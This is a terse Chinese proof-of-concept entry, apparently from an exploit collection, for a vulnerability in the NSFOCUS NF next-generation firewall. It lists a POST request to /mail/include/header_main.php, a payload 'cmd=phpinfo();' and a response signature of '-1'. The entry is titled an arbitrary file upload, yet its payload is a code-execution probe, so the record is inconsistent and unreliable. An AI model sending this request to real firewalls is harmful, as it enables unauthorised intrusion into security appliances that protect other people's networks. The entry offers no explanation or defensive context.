# 绿盟NF下一代防火墙任意文件上传漏洞2

绿盟NF下一代防火墙 ｜ 文件上传 ｜ —
- **请求**：`POST /mail/include/header_main.php HTTP/1.1`

**Payload**
```
cmd=phpinfo();
```
- **响应特征**：-1